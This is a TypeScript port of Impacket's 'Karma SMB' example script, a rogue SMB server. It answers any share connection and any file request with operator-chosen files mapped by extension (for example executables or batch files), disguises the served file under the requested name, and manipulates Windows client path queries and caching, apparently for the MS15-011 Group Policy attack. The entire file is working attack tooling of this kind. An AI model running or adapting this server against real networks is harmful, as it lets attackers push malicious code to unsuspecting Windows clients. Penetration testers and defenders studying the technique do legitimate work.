#!/usr/bin/env node
// Impacket - Collection of TypeScript classes for working with network protocols.
//
// Copyright Fortra, LLC and its affiliated companies
//
// All rights reserved.
//
// This software is provided under a slightly modified version
// of the Apache Software License. See the accompanying LICENSE file
// for more information.
//
// Description:
//   Karma SMB
//
//   The idea of this script is to answer any file read request
//   with a set of predefined contents based on the extension
//   asked, regardless of the sharename and/or path.
//   When executing this script w/o a config file the pathname
//   file contents will be sent for every request.
//   If a config file is specified, format should be this way:
//      <extension> = <pathname>
//   for example:
//      bat = /tmp/batchfile
//      com = /tmp/comfile
//      exe = /tmp/exefile
//
//   The SMB2 support works with a caveat. If two different
//   filenames at the same share are requested, the first
//   one will work and the second one will not work if the request
//   is performed right away. See the original impacket notes.
//
// Author:
//   Alberto Solino (@agsolino)
//   Original idea by @mubix
//   TypeScript port
//
// Reference for:
//   SMB Server (MS-SMB / MS-SMB2)

import { parseArgs } from 'node:util';
import { readFileSync, statSync } from 'node:fs';
import path from 'node:path';
import {
  init as initLogger,
  initProxy,
  info,
  error,
  critical,
  normalizeArgs,
  BANNER,
} from '@impacket/examples';
import * as smb from '@impacket/smb';
import * as smb2 from '@impacket/smb3';
import {
  SMBSERVER,
  ConfigParser,
  decodeSMBString,
  encodeSMBString,
  findFirst2 as libFindFirst2,
  queryPathInformation as libQueryPathInformation,
  STATUS_SMB_BAD_TID,
} from '@impacket/smb-server';
import {
  STATUS_SUCCESS,
  STATUS_ACCESS_DENIED,
  STATUS_USER_SESSION_DELETED,
  STATUS_NO_MORE_FILES,
  STATUS_OBJECT_PATH_NOT_FOUND,
} from '@impacket/nt-errors';

// ---------------------------------------------------------------------------
// os.path.* equivalents (impacket normalizes with forward slashes first)
// ---------------------------------------------------------------------------

function normpath(p: string): string {
  // Mirror os.path.normpath on a POSIX-style path.
  const normalized = path.posix.normalize(p.replace(/\\/g, '/'));
  return normalized === '' ? '.' : normalized;
}

function splitextUpper(p: string): string {
  // Returns the (upper-cased) extension without the leading dot.
  const ext = path.posix.extname(p);
  return ext.toUpperCase().slice(1);
}

// ---------------------------------------------------------------------------
// KarmaSMBServer
// ---------------------------------------------------------------------------

class KarmaSMBServer {
  private server: SMBSERVER;
  private defaultFile: string | null = null;
  private extensions: Record<string, string> = {};

  // Captured original command handlers (returned by the hook* calls)
  private origsmbComNtCreateAndX!: (...a: any[]) => any;
  private origsmb2Create!: (...a: any[]) => any;
  private origsmb2Read!: (...a: any[]) => any;
  private origsmb2Close!: (...a: any[]) => any;

  constructor(smb2Support = false, listenPort = 445) {
    // Here we write a mini config for the server
    const smbConfig = new ConfigParser();
    smbConfig.addSection('global');
    smbConfig.set('global', 'server_name', 'server_name');
    smbConfig.set('global', 'server_os', 'UNIX');
    smbConfig.set('global', 'server_domain', 'WORKGROUP');
    smbConfig.set('global', 'log_file', 'None');
    smbConfig.set('global', 'credentials_file', '');

    // IPC always needed
    smbConfig.addSection('IPC$');
    smbConfig.set('IPC$', 'comment', 'Logon server share');
    smbConfig.set('IPC$', 'read only', 'yes');
    smbConfig.set('IPC$', 'share type', '3');
    smbConfig.set('IPC$', 'path', '');

    // NETLOGON always needed
    smbConfig.addSection('NETLOGON');
    smbConfig.set('NETLOGON', 'comment', 'Logon server share');
    smbConfig.set('NETLOGON', 'read only', 'no');
    smbConfig.set('NETLOGON', 'share type', '0');
    smbConfig.set('NETLOGON', 'path', '');

    // SYSVOL always needed
    smbConfig.addSection('SYSVOL');
    smbConfig.set('SYSVOL', 'comment', '');
    smbConfig.set('SYSVOL', 'read only', 'no');
    smbConfig.set('SYSVOL', 'share type', '0');
    smbConfig.set('SYSVOL', 'path', '');

    if (smb2Support) {
      smbConfig.set('global', 'SMB2Support', 'True');
    }

    this.server = new SMBSERVER('0.0.0.0', listenPort, smbConfig);
    this.server.processConfigFile();

    // Unregistering some dangerous and unwanted commands
    this.server.unregisterSmbCommand(smb.SMB_COMMAND_CREATE_DIRECTORY);
    this.server.unregisterSmbCommand(smb.SMB_COMMAND_DELETE_DIRECTORY);
    this.server.unregisterSmbCommand(smb.SMB_COMMAND_RENAME);
    this.server.unregisterSmbCommand(smb.SMB_COMMAND_DELETE);
    this.server.unregisterSmbCommand(smb.SMB_COMMAND_WRITE);
    this.server.unregisterSmbCommand(smb.SMB_COMMAND_WRITE_ANDX);

    this.server.unregisterSmb2Command(smb2.SMB2_WRITE);

    this.origsmbComNtCreateAndX = this.server.hookSmbCommand(
      smb.SMB_COMMAND_NT_CREATE_ANDX,
      (connId: string, smbServer: SMBSERVER, SMBCommand: any, recvPacket: any) =>
        this.smbComNtCreateAndX(connId, smbServer, SMBCommand, recvPacket),
    )!;
    this.server.hookSmbCommand(
      smb.SMB_COMMAND_TREE_CONNECT_ANDX,
      (connId: string, smbServer: SMBSERVER, SMBCommand: any, recvPacket: any) =>
        this.smbComTreeConnectAndX(connId, smbServer, SMBCommand, recvPacket),
    );
    this.server.hookTransaction2(
      smb.TRANS2_QUERY_PATH_INFORMATION,
      (connId: string, smbServer: SMBSERVER, recvPacket: any, parameters: Buffer, data: Buffer, maxDataCount: number) =>
        this.queryPathInformation(connId, smbServer, recvPacket, parameters, data, maxDataCount),
    );
    this.server.hookTransaction2(
      smb.TRANS2_FIND_FIRST2,
      (connId: string, smbServer: SMBSERVER, recvPacket: any, parameters: Buffer, data: Buffer, maxDataCount: number) =>
        this.findFirst2(connId, smbServer, recvPacket, parameters, data, maxDataCount),
    );

    // And the same for SMB2
    this.server.hookSmb2Command(
      smb2.SMB2_TREE_CONNECT,
      (connId: string, smbServer: SMBSERVER, recvPacket: any) =>
        this.smb2TreeConnect(connId, smbServer, recvPacket),
    );
    this.origsmb2Create = this.server.hookSmb2Command(
      smb2.SMB2_CREATE,
      (connId: string, smbServer: SMBSERVER, recvPacket: any) =>
        this.smb2Create(connId, smbServer, recvPacket),
    )!;
    this.server.hookSmb2Command(
      smb2.SMB2_QUERY_DIRECTORY,
      (connId: string, smbServer: SMBSERVER, recvPacket: any) =>
        this.smb2QueryDirectory(connId, smbServer, recvPacket),
    );
    this.origsmb2Read = this.server.hookSmb2Command(
      smb2.SMB2_READ,
      (connId: string, smbServer: SMBSERVER, recvPacket: any) =>
        this.smb2Read(connId, smbServer, recvPacket),
    )!;
    this.origsmb2Close = this.server.hookSmb2Command(
      smb2.SMB2_CLOSE,
      (connId: string, smbServer: SMBSERVER, recvPacket: any) =>
        this.smb2Close(connId, smbServer, recvPacket),
    )!;

    // NOTE: impacket also registers an MS-SRVS named pipe server (SRVSServer)
    // here so Windows 7+/OSX clients can enumerate shares over MS-SRVS. That
    // subsystem is not yet available in jspacket, so it is omitted. Share
    // delivery still works for the SMB_COM_NT_CREATE_ANDX / SMB2_CREATE path.
  }

  // -------------------------------------------------------------------------
  // TRANS2_FIND_FIRST2
  // -------------------------------------------------------------------------

  findFirst2(
    connId: string, smbServer: SMBSERVER, recvPacket: any,
    parameters: Buffer, _data: Buffer, maxDataCount: number,
  ): [Buffer, Buffer, Buffer, number] {
    const connData: any = smbServer.getConnectionData(connId);

    const respSetup = Buffer.alloc(0);
    let respParameters: Buffer = Buffer.alloc(0);
    let respData: Buffer = Buffer.alloc(0);
    let errorCode = STATUS_SUCCESS;

    const flags2 = recvPacket.get('Flags2') as number;
    const findFirst2Parameters = new smb.SMBFindFirst2_Parameters(flags2, parameters);

    // 1. Let's grab the extension and map the file's contents we will deliver
    const origPathName = normpath(
      decodeSMBString(flags2, findFirst2Parameters.get('FileName') as Buffer),
    );
    const origFileName = path.posix.basename(origPathName);

    const origPathNameExtension = splitextUpper(origPathName);

    let targetFile: string;
    if (origPathNameExtension.toUpperCase() in this.extensions) {
      targetFile = this.extensions[origPathNameExtension.toUpperCase()]!;
    } else {
      targetFile = this.defaultFile!;
    }

    const tid = recvPacket.get('Tid') as number;
    if (connData.ConnectedShares[tid]) {
      const sharePath = connData.ConnectedShares[tid].path;

      // 2. We call the normal findFirst2 call, but with our targetFile
      const [searchResult, , libErrorCode] = libFindFirst2(
        sharePath,
        targetFile,
        findFirst2Parameters.get('InformationLevel') as number,
        findFirst2Parameters.get('SearchAttributes') as number,
        flags2,
      );
      errorCode = libErrorCode;

      const respParams = new smb.SMBFindFirst2Response_Parameters();
      let endOfSearch = 1;
      let sid = 0x80; // default SID
      let searchCount = 0;
      let totalData = 0;

      for (let i = 0; i < searchResult.length; i++) {
        const entry = searchResult[i];
        try {
          // 3. And we restore the original filename requested ;)
          entry.set('FileName', encodeSMBString(flags2, origFileName));
        } catch {
          // ignore
        }

        const entryData = entry.getData() as Buffer;
        const lenData = entryData.length;
        if (
          totalData + lenData >= maxDataCount ||
          i + 1 > (findFirst2Parameters.get('SearchCount') as number)
        ) {
          // We gotta stop here and continue on a find_next2
          endOfSearch = 0;
          // Simple way to generate a fid
          const sidKeys = Object.keys(connData.SIDs);
          if (sidKeys.length === 0) {
            sid = 1;
          } else {
            sid = Number(sidKeys[sidKeys.length - 1]) + 1;
          }
          // Store the remaining search results in the ConnData SID
          connData.SIDs[sid] = searchResult.slice(i);
          respParams.set('LastNameOffset', totalData);
          break;
        } else {
          searchCount += 1;
          respData = Buffer.concat([respData, entryData]);
          totalData += lenData;
        }
      }

      respParams.set('SID', sid);
      respParams.set('EndOfSearch', endOfSearch);
      respParams.set('SearchCount', searchCount);
      respParameters = respParams.getData();
    } else {
      errorCode = STATUS_SMB_BAD_TID;
    }

    smbServer.setConnectionData(connId, connData);

    return [respSetup, respParameters, respData, errorCode];
  }

  // -------------------------------------------------------------------------
  // SMB_COM_NT_CREATE_ANDX
  // -------------------------------------------------------------------------

  smbComNtCreateAndX(
    connId: string, smbServer: SMBSERVER, SMBCommand: any, recvPacket: any,
  ): [any[], any | null, number] {
    const connData: any = smbServer.getConnectionData(connId);

    const ntCreateAndXParameters = new smb.SMBNtCreateAndX_Parameters();
    ntCreateAndXParameters.fromString(SMBCommand.get('Parameters') as Buffer);

    const flags2 = recvPacket.get('Flags2') as number;
    const ntCreateAndXData = new smb.SMBNtCreateAndX_Data(flags2, SMBCommand.get('Data') as Buffer);

    const respSMBCommand = new smb.SMBCommand(smb.SMB_COMMAND_NT_CREATE_ANDX);

    // Let's try to avoid allowing write requests from the client back to us
    // not 100% bulletproof, plus also the client might be using other SMB
    // calls (e.g. SMB_COM_WRITE)
    const createOptions = ntCreateAndXParameters.get('CreateOptions') as number;
    const disposition = ntCreateAndXParameters.get('Disposition') as number;
    const accessMask = ntCreateAndXParameters.get('AccessMask') as number;

    let errorCode: number;
    if ((createOptions & smb.FILE_DELETE_ON_CLOSE) === smb.FILE_DELETE_ON_CLOSE) {
      errorCode = STATUS_ACCESS_DENIED;
    } else if ((disposition & smb.FILE_OVERWRITE) === smb.FILE_OVERWRITE) {
      errorCode = STATUS_ACCESS_DENIED;
    } else if ((disposition & smb.FILE_OVERWRITE_IF) === smb.FILE_OVERWRITE_IF) {
      errorCode = STATUS_ACCESS_DENIED;
    } else if ((accessMask & smb.FILE_WRITE_DATA) === smb.FILE_WRITE_DATA) {
      errorCode = STATUS_ACCESS_DENIED;
    } else if ((accessMask & smb.FILE_APPEND_DATA) === smb.FILE_APPEND_DATA) {
      errorCode = STATUS_ACCESS_DENIED;
    } else if ((accessMask & smb.GENERIC_WRITE) === smb.GENERIC_WRITE) {
      errorCode = STATUS_ACCESS_DENIED;
    } else if ((accessMask & 0x10000) === 0x10000) {
      errorCode = STATUS_ACCESS_DENIED;
    } else {
      errorCode = STATUS_SUCCESS;
    }

    if (errorCode === STATUS_ACCESS_DENIED) {
      return [[respSMBCommand], null, errorCode];
    }

    // 1. Let's grab the extension and map the file's contents we will deliver
    const origPathName = normpath(
      decodeSMBString(flags2, ntCreateAndXData.get('FileName') as Buffer),
    );

    const origPathNameExtension = splitextUpper(origPathName);

    let targetFile: string;
    if (origPathNameExtension.toUpperCase() in this.extensions) {
      targetFile = this.extensions[origPathNameExtension.toUpperCase()]!;
    } else {
      targetFile = this.defaultFile!;
    }

    // 2. We change the filename in the request for our targetFile
    ntCreateAndXData.set('FileName', encodeSMBString(flags2, targetFile));
    SMBCommand.set('Data', ntCreateAndXData.getData());
    smbServer.log(`${connData.ClientIP} is asking for ${origPathName}. Delivering ${targetFile}`, 'info');

    // 3. We call the original call with our modified data
    return this.origsmbComNtCreateAndX(connId, smbServer, SMBCommand, recvPacket);
  }

  // -------------------------------------------------------------------------
  // TRANS2_QUERY_PATH_INFORMATION
  // -------------------------------------------------------------------------

  queryPathInformation(
    connId: string, smbServer: SMBSERVER, recvPacket: any,
    parameters: Buffer, _data: Buffer, _maxDataCount = 0,
  ): [Buffer, Buffer, Buffer, number] {
    // The trick we play here is that Windows clients first ask for the file
    // and then it asks for the directory containing the file.
    const connData: any = smbServer.getConnectionData(connId);

    const respSetup = Buffer.alloc(0);
    let respParameters: Buffer = Buffer.alloc(0);
    let respData: Buffer = Buffer.alloc(0);
    let errorCode = 0;

    const flags2 = recvPacket.get('Flags2') as number;
    const queryPathInfoParameters = new smb.SMBQueryPathInformation_Parameters(flags2, parameters);

    const tid = recvPacket.get('Tid') as number;
    if (connData.ConnectedShares[tid]) {
      const sharePath = '';
      let infoRecord: Buffer | null = null;
      try {
        const origPathName = normpath(
          decodeSMBString(flags2, queryPathInfoParameters.get('FileName') as Buffer),
        );

        if (!('MS15011' in connData)) {
          connData.MS15011 = {};
        }

        smbServer.log(`Client is asking for QueryPathInformation for: ${origPathName}`, 'info');
        const level = queryPathInfoParameters.get('InformationLevel') as number;
        if (origPathName in connData.MS15011 || origPathName === '.') {
          // We already processed this entry, now it's asking for a directory
          [infoRecord, errorCode] = libQueryPathInformation(sharePath, '/', level);
        } else {
          // First time asked, asking for the file
          [infoRecord, errorCode] = libQueryPathInformation(sharePath, this.defaultFile!, level);
          connData.MS15011[path.posix.dirname(origPathName)] = infoRecord;
        }
      } catch (e) {
        smbServer.log(`queryPathInformation: ${e}`, 'error');
        infoRecord = null;
      }

      if (infoRecord !== null) {
        respParameters = new smb.SMBQueryPathInformationResponse_Parameters().getData();
        respData = infoRecord;
      }
    } else {
      errorCode = STATUS_SMB_BAD_TID;
    }

    smbServer.setConnectionData(connId, connData);

    return [respSetup, respParameters, respData, errorCode];
  }

  // -------------------------------------------------------------------------
  // SMB2_READ
  // -------------------------------------------------------------------------

  smb2Read(connId: string, smbServer: SMBSERVER, recvPacket: any): any {
    const connData: any = smbServer.getConnectionData(connId);
    connData.MS15011.StopConnection = true;
    smbServer.setConnectionData(connId, connData);
    return this.origsmb2Read(connId, smbServer, recvPacket);
  }

  // -------------------------------------------------------------------------
  // SMB2_CLOSE
  // -------------------------------------------------------------------------

  smb2Close(connId: string, smbServer: SMBSERVER, recvPacket: any): [any[], any | null, number] {
    const connData: any = smbServer.getConnectionData(connId);
    // We're closing the connection trying to flush the client's cache.
    if (connData.MS15011.StopConnection === true) {
      const respPacket = this.buildSMB2ErrorPacket(connData, recvPacket, STATUS_USER_SESSION_DELETED);
      return [[], respPacket, STATUS_USER_SESSION_DELETED];
    }
    return this.origsmb2Close(connId, smbServer, recvPacket);
  }

  // -------------------------------------------------------------------------
  // SMB2_CREATE
  // -------------------------------------------------------------------------

  smb2Create(connId: string, smbServer: SMBSERVER, recvPacket: any): [any[], any | null, number] {
    const connData: any = smbServer.getConnectionData(connId);

    const ntCreateRequest = new smb2.SMB2Create(recvPacket.get('Data') as Buffer);

    // Let's try to avoid allowing write requests from the client back to us
    const createOptions = ntCreateRequest.get('CreateOptions') as number;
    const createDisposition = ntCreateRequest.get('CreateDisposition') as number;
    const desiredAccess = ntCreateRequest.get('DesiredAccess') as number;

    let errorCode: number;
    if ((createOptions & smb2.FILE_DELETE_ON_CLOSE) === smb2.FILE_DELETE_ON_CLOSE) {
      errorCode = STATUS_ACCESS_DENIED;
    } else if ((createDisposition & smb2.FILE_OVERWRITE) === smb2.FILE_OVERWRITE) {
      errorCode = STATUS_ACCESS_DENIED;
    } else if ((createDisposition & smb2.FILE_OVERWRITE_IF) === smb2.FILE_OVERWRITE_IF) {
      errorCode = STATUS_ACCESS_DENIED;
    } else if ((desiredAccess & smb2.FILE_WRITE_DATA) === smb2.FILE_WRITE_DATA) {
      errorCode = STATUS_ACCESS_DENIED;
    } else if ((desiredAccess & smb2.FILE_APPEND_DATA) === smb2.FILE_APPEND_DATA) {
      errorCode = STATUS_ACCESS_DENIED;
    } else if ((desiredAccess & smb2.GENERIC_WRITE) === smb2.GENERIC_WRITE) {
      errorCode = STATUS_ACCESS_DENIED;
    } else if ((desiredAccess & 0x10000) === 0x10000) {
      errorCode = STATUS_ACCESS_DENIED;
    } else {
      errorCode = STATUS_SUCCESS;
    }

    if (errorCode === STATUS_ACCESS_DENIED) {
      const respPacket = this.buildSMB2ErrorPacket(connData, recvPacket, errorCode);
      return [[], respPacket, errorCode];
    }

    // 1. Let's grab the extension and map the file's contents we will deliver
    const nameLength = ntCreateRequest.get('NameLength') as number;
    const nameBuf = (ntCreateRequest.get('Buffer') as Buffer).subarray(0, nameLength);
    const origPathName = normpath(nameBuf.toString('utf16le'));

    const origPathNameExtension = splitextUpper(origPathName);

    // Are we being asked for a directory?
    let targetFile: string;
    if ((createOptions & smb2.FILE_DIRECTORY_FILE) === 0) {
      if (origPathNameExtension.toUpperCase() in this.extensions) {
        targetFile = this.extensions[origPathNameExtension.toUpperCase()]!;
      } else {
        targetFile = this.defaultFile!;
      }
      connData.MS15011.FileData = [path.posix.basename(origPathName), targetFile];
      smbServer.log(`${connData.ClientIP} is asking for ${origPathName}. Delivering ${targetFile}`, 'info');
    } else {
      targetFile = '/';
    }

    // 2. We change the filename in the request for our targetFile
    ntCreateRequest.set('Buffer', Buffer.from(targetFile, 'utf16le'));
    ntCreateRequest.set('NameLength', targetFile.length * 2);
    recvPacket.set('Data', ntCreateRequest.getData());

    smbServer.setConnectionData(connId, connData);

    // 3. We call the original call with our modified data
    return this.origsmb2Create(connId, smbServer, recvPacket);
  }

  // -------------------------------------------------------------------------
  // SMB2_QUERY_DIRECTORY
  // -------------------------------------------------------------------------

  smb2QueryDirectory(connId: string, smbServer: SMBSERVER, recvPacket: any): [any[], any | null, number] {
    // Windows clients with SMB2 will also perform a QueryDirectory
    // expecting to get the filename asked. So we deliver it :)
    const connData: any = smbServer.getConnectionData(connId);

    const respSMBCommand = new smb2.SMB2QueryDirectory_Response();

    const errorCode = STATUS_SUCCESS;
    respSMBCommand.set('Buffer', Buffer.from([0x00]));

    if (connData.MS15011.FindDone === true || !connData.MS15011.FileData) {
      connData.MS15011.FindDone = false;
      smbServer.setConnectionData(connId, connData);
      const respPacket = this.buildSMB2ErrorPacket(connData, recvPacket, STATUS_NO_MORE_FILES);
      return [[], respPacket, STATUS_NO_MORE_FILES];
    } else {
      const [origName, targetFile] = connData.MS15011.FileData as [string, string];
      const st = statSync(targetFile);
      const size = st.size;

      const infoRecord = new smb.SMBFindFileIdBothDirectoryInfo(smb.FLAGS2_UNICODE);
      infoRecord.set('ExtFileAttributes', smb.ATTR_NORMAL | smb.ATTR_ARCHIVE);

      infoRecord.set('EaSize', 0);
      infoRecord.set('EndOfFile', BigInt(size));
      infoRecord.set('AllocationSize', BigInt(size));
      infoRecord.set('CreationTime', smb.POSIXtoFT(Math.floor(st.ctimeMs / 1000)));
      infoRecord.set('LastAccessTime', smb.POSIXtoFT(Math.floor(st.atimeMs / 1000)));
      infoRecord.set('LastWriteTime', smb.POSIXtoFT(Math.floor(st.mtimeMs / 1000)));
      infoRecord.set('LastChangeTime', smb.POSIXtoFT(Math.floor(st.mtimeMs / 1000)));
      infoRecord.set('ShortName', Buffer.alloc(24));
      infoRecord.set('FileName', Buffer.from(origName, 'utf16le'));
      const recordData = infoRecord.getData() as Buffer;
      const padLen = (8 - (recordData.length % 8)) % 8;
      infoRecord.set('NextEntryOffset', 0);
      const finalData = infoRecord.getData() as Buffer;

      respSMBCommand.set('OutputBufferOffset', 0x48);
      respSMBCommand.set('OutputBufferLength', finalData.length);
      respSMBCommand.set('Buffer', Buffer.concat([finalData, Buffer.alloc(padLen, 0xaa)]));
      connData.MS15011.FindDone = true;
    }

    const respPacket = this.buildSMB2Packet(connData, recvPacket, STATUS_SUCCESS);
    respPacket.set('Data', respSMBCommand.getData());

    smbServer.setConnectionData(connId, connData);
    return [[], respPacket, errorCode];
  }

  // -------------------------------------------------------------------------
  // SMB2_TREE_CONNECT
  // -------------------------------------------------------------------------

  smb2TreeConnect(connId: string, smbServer: SMBSERVER, recvPacket: any): [any[], any | null, number] {
    const connData: any = smbServer.getConnectionData(connId);

    const respPacket = new smb2.SMB2Packet();
    respPacket.set('Flags', smb2.SMB2_FLAGS_SERVER_TO_REDIR);
    respPacket.set('Status', STATUS_SUCCESS);
    respPacket.set('CreditRequestResponse', 1);
    respPacket.set('Command', recvPacket.get('Command') as number);
    respPacket.set('SessionID', connData.Uid);
    respPacket.set('Reserved', recvPacket.get('Reserved') as number);
    respPacket.set('MessageID', recvPacket.get('MessageID') as bigint);
    respPacket.set('TreeID', recvPacket.get('TreeID') as number);

    const respSMBCommand = new smb2.SMB2TreeConnect_Response();

    const treeConnectRequest = new smb2.SMB2TreeConnect(recvPacket.get('Data') as Buffer);

    let errorCode = STATUS_SUCCESS;

    // Process here the request, does the share exist?
    const pathOffset = treeConnectRequest.get('PathOffset') as number;
    const pathLength = treeConnectRequest.get('PathLength') as number;
    const rawPacket = recvPacket.getData() as Buffer;
    const UNCOrShare = rawPacket.subarray(pathOffset, pathOffset + pathLength).toString('utf16le');

    // Is this a UNC?  (\\server\share\...)
    let sharePath: string;
    if (UNCOrShare.startsWith('\\\\')) {
      sharePath = UNCOrShare.split('\\')[3] || '';
    } else {
      sharePath = path.win32.basename(UNCOrShare);
    }

    // We won't search for the share.. all of them exist :P
    connData.MS15011 = {};
    connData.MS15011.FindDone = false;
    connData.MS15011.StopConnection = false;
    const share: any = {};
    if (share !== null) {
      // Simple way to generate a Tid
      const tidKeys = Object.keys(connData.ConnectedShares);
      let tid: number;
      if (tidKeys.length === 0) {
        tid = 1;
      } else {
        tid = Number(tidKeys[tidKeys.length - 1]) + 1;
      }
      connData.ConnectedShares[tid] = share;
      connData.ConnectedShares[tid].path = '/';
      connData.ConnectedShares[tid].shareName = sharePath;
      respPacket.set('TreeID', tid);
    } else {
      smbServer.log(`SMB2_TREE_CONNECT not found ${sharePath}`, 'error');
      errorCode = STATUS_OBJECT_PATH_NOT_FOUND;
      respPacket.set('Status', errorCode);
    }

    if (sharePath === 'IPC$') {
      respSMBCommand.set('ShareType', smb2.SMB2_SHARE_TYPE_PIPE);
      respSMBCommand.set('ShareFlags', 0x30);
    } else {
      respSMBCommand.set('ShareType', smb2.SMB2_SHARE_TYPE_DISK);
      respSMBCommand.set('ShareFlags', 0x0);
    }

    respSMBCommand.set('Capabilities', 0);
    respSMBCommand.set('MaximalAccess', 0x011f01ff);

    respPacket.set('Data', respSMBCommand.getData());

    smbServer.setConnectionData(connId, connData);

    return [[], respPacket, errorCode];
  }

  // -------------------------------------------------------------------------
  // SMB_COM_TREE_CONNECT_ANDX
  // -------------------------------------------------------------------------

  smbComTreeConnectAndX(
    connId: string, smbServer: SMBSERVER, SMBCommand: any, recvPacket: any,
  ): [any[], any | null, number] {
    const connData: any = smbServer.getConnectionData(connId);

    const resp = new smb.NewSMBPacket();
    resp.set('Flags1', smb.FLAGS1_REPLY);
    resp.set(
      'Flags2',
      smb.FLAGS2_EXTENDED_SECURITY | smb.FLAGS2_NT_STATUS | smb.FLAGS2_LONG_NAMES |
        ((recvPacket.get('Flags2') as number) & smb.FLAGS2_UNICODE),
    );

    resp.set('Tid', recvPacket.get('Tid') as number);
    resp.set('Mid', recvPacket.get('Mid') as number);
    resp.set('Pid', connData.Pid);

    const respSMBCommand = new smb.SMBCommand(smb.SMB_COMMAND_TREE_CONNECT_ANDX);
    let respParameters: any = new smb.SMBTreeConnectAndXResponse_Parameters();
    const respData = new smb.SMBTreeConnectAndXResponse_Data();

    const flags2 = recvPacket.get('Flags2') as number;
    const treeConnectAndXParameters = new smb.SMBTreeConnectAndX_Parameters();
    treeConnectAndXParameters.fromString(SMBCommand.get('Parameters') as Buffer);

    if ((treeConnectAndXParameters.get('Flags') as number) & 0x8) {
      respParameters = new smb.SMBTreeConnectAndXExtendedResponse_Parameters();
    }

    const treeConnectAndXData = new smb.SMBTreeConnectAndX_Data(flags2);
    treeConnectAndXData.set('_PasswordLength', treeConnectAndXParameters.get('PasswordLength') as number);
    treeConnectAndXData.fromString(SMBCommand.get('Data') as Buffer);

    const errorCode = STATUS_SUCCESS;

    const UNCOrShare = decodeSMBString(flags2, treeConnectAndXData.get('Path') as Buffer);

    // Is this a UNC?
    let sharePath: string;
    if (UNCOrShare.startsWith('\\\\')) {
      sharePath = UNCOrShare.split('\\')[3] || '';
    } else {
      sharePath = path.win32.basename(UNCOrShare);
    }

    // We won't search for the share.. all of them exist :P
    smbServer.log(`TreeConnectAndX request for ${sharePath}`, 'info');
    const share: any = {};
    // Simple way to generate a Tid
    const tidKeys = Object.keys(connData.ConnectedShares);
    let tid: number;
    if (tidKeys.length === 0) {
      tid = 1;
    } else {
      tid = Number(tidKeys[tidKeys.length - 1]) + 1;
    }
    connData.ConnectedShares[tid] = share;
    connData.ConnectedShares[tid].path = '/';
    connData.ConnectedShares[tid].shareName = sharePath;
    resp.set('Tid', tid);

    respParameters.set('OptionalSupport', smb.SMB_SUPPORT_SEARCH_BITS);

    if (sharePath === 'IPC$') {
      respData.set('Service', 'IPC');
    } else {
      respData.set('Service', sharePath);
    }
    respData.set('PadLen', 0);
    respData.set('NativeFileSystem', encodeSMBString(flags2, 'NTFS').toString());

    respSMBCommand.set('Parameters', respParameters.getData());
    respSMBCommand.set('Data', respData.getData());

    resp.set('Uid', connData.Uid);
    resp.addCommand(respSMBCommand);
    smbServer.setConnectionData(connId, connData);

    return [[], resp, errorCode];
  }

  // -------------------------------------------------------------------------
  // SMB2 response packet helpers
  // -------------------------------------------------------------------------

  private buildSMB2Packet(connData: any, recvPacket: any, status: number): any {
    const respPacket = new smb2.SMB2Packet();
    respPacket.set('Command', recvPacket.get('Command') as number);
    respPacket.set('Flags', smb2.SMB2_FLAGS_SERVER_TO_REDIR);
    respPacket.set('Status', status);
    respPacket.set('CreditRequestResponse', 1);
    respPacket.set('SessionID', connData.Uid);
    respPacket.set('TreeID', recvPacket.get('TreeID') as number);
    respPacket.set('MessageID', recvPacket.get('MessageID') as bigint);
    return respPacket;
  }

  private buildSMB2ErrorPacket(connData: any, recvPacket: any, status: number): any {
    const respPacket = this.buildSMB2Packet(connData, recvPacket, status);
    respPacket.set('Data', new smb2.SMB2Error().getData());
    return respPacket;
  }

  // -------------------------------------------------------------------------
  // Lifecycle
  // -------------------------------------------------------------------------

  start(): void {
    info('Setting up SMB Server');
    this.server.serveForever();
  }

  setDefaultFile(filename: string): void {
    this.defaultFile = filename;
  }

  setExtensionsConfig(configPath: string): void {
    const contents = readFileSync(configPath, 'utf-8');
    for (let line of contents.split('\n')) {
      line = line.replace(/[\r\n ]+$/g, '').replace(/^[\r\n ]+/g, '');
      if (!line.startsWith('#') && line.length > 0) {
        const idx = line.indexOf('=');
        if (idx < 0) continue;
        const extension = line.slice(0, idx);
        const pathName = line.slice(idx + 1);
        this.extensions[extension.trim().toUpperCase()] = normpath(pathName.trim());
      }
    }
  }
}

// ---------------------------------------------------------------------------
// CLI
// ---------------------------------------------------------------------------

function printBanner(): void {
  console.log(BANNER + '\n');
}

function printUsage(): void {
  console.log(`usage: karmaSMB [--help] [-config pathname] [-smb2support] [-ts] [-debug] pathname

For every file request received, this module will return the pathname contents

positional arguments:
  pathname       Pathname's contents to deliver to SMB clients

options:
  --help         show this help message and exit
  -config pathname
                 config file name to map extensions to files to deliver. For
                 those extensions not present, pathname will be delivered
  -smb2support   SMB2 Support (experimental!)
  -ts            Adds timestamp to every logging output
  -debug         Turn DEBUG output ON
`);
}

async function main(): Promise<void> {
  printBanner();

  const argv = normalizeArgs(process.argv.slice(2));

  let values: any;
  let positionals: string[];
  try {
    ({ values, positionals } = parseArgs({
      args: argv,
      allowPositionals: true,
      options: {
        config: { type: 'string' },
        port: { type: 'string', default: '445' },
        smb2support: { type: 'boolean', default: false },
        ts: { type: 'boolean', default: false },
        debug: { type: 'boolean', default: false },
        proxy: { type: 'string' },
        help: { type: 'boolean', short: 'h', default: false },
      },
    }));
  } catch (e) {
    console.error(`[-] ${(e as Error).message}`);
    printUsage();
    process.exit(1);
  }

  if (values.help || positionals.length === 0) {
    printUsage();
    process.exit(positionals.length === 0 ? 1 : 0);
  }

  // Init the example's logger theme
  initLogger({ ts: values.ts, debug: values.debug });
  initProxy(values.proxy);

  const fileName = positionals[0]!;

  const s = new KarmaSMBServer(values.smb2support, parseInt(values.port!, 10));
  s.setDefaultFile(normpath(fileName));
  if (values.config) {
    s.setExtensionsConfig(values.config);
  }

  s.start();

  info('Servers started, waiting for connections');

  // Keep the process alive until interrupted.
  process.stdin.resume();
  process.on('SIGINT', () => {
    process.exit(1);
  });
}

main().catch((e) => {
  critical(String(e));
  process.exit(1);
});
